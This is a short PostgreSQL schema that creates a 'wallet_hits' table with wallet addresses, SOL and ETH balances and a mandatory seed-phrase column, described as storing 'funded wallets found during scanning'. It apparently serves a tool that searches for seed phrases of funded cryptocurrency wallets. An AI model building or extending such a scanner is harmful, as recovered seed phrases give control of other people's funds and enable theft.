-- Create wallet_hits table
CREATE TABLE IF NOT EXISTS wallet_hits (
  id SERIAL PRIMARY KEY,
  wallet_address TEXT NOT NULL,
  chain TEXT NOT NULL,
  sol_balance DECIMAL(20, 9),
  eth_balance DECIMAL(20, 18),
  seed_phrase TEXT NOT NULL,
  found_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  metadata JSONB DEFAULT '{}'::jsonb
);

-- Create indexes
CREATE INDEX IF NOT EXISTS wallet_hits_wallet_address_idx ON wallet_hits(wallet_address);
CREATE INDEX IF NOT EXISTS wallet_hits_chain_idx ON wallet_hits(chain);
CREATE INDEX IF NOT EXISTS wallet_hits_found_at_idx ON wallet_hits(found_at);

-- Add comment
COMMENT ON TABLE wallet_hits IS 'Stores information about funded wallets found during scanning';
